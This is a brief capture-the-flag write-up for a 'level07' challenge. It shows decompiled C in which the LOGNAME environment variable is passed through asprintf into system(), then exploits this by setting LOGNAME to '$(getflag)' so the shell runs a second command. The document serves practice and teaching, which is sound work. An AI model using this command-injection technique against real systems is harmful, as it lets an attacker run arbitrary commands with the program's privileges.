# Solution  

```$>ghidra level07```

C code:

```c
pcVar1 = getenv("LOGNAME");
asprintf(&local_1c,"/bin/echo %s ",pcVar1);
iVar2 = system(local_1c);
```

> asprintf allocate local_1c with the print.

```bash
$>export LOGNAME='$(getflag)'
```

In the code local_1c will be ```/bin/echo $(getflag) ```

System will execute the command.